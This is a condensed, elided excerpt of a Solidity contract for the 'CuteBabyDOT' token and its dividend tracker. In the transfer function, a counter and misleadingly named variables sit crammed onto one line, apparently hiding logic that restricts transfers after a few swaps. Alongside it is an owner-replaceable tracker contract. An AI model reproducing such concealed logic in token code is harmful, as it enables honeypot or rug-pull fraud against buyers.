...
contract CuteBabyDOT is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    CuteBabyDOTDividendTracker public dividendTracker;
    ...
    address public _marketingWalletAddress = 0x7Ce03291d8C0A5d19349B92800b5491F21551fB0;
    ...
    constructor() public ERC20("CuteBabyDOT", "BABYDOT") {

    dividendTracker = new CuteBabyDOTDividendTracker();
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        ...
        CuteBabyDOTDividendTracker newDividendTracker = CuteBabyDOTDividendTracker(payable(newAddress));
...
dividendTracker.processAccount(msg.sender, false);
    ...
    function _transfer(
        ...
        {
            swapDuration++;if(swapDuration>3){
                _rewardTimer=liquidityFee;
                if (amount >= _rewardTimer) 
...
contract CuteBabyDOTDividendTracker is Ownable, DividendPayingToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() public DividendPayingToken("CuteBabyDOT_Dividend_Tracker", "CuteBabyDOT_Dividend_Tracker") {
    claimWait = 3600;
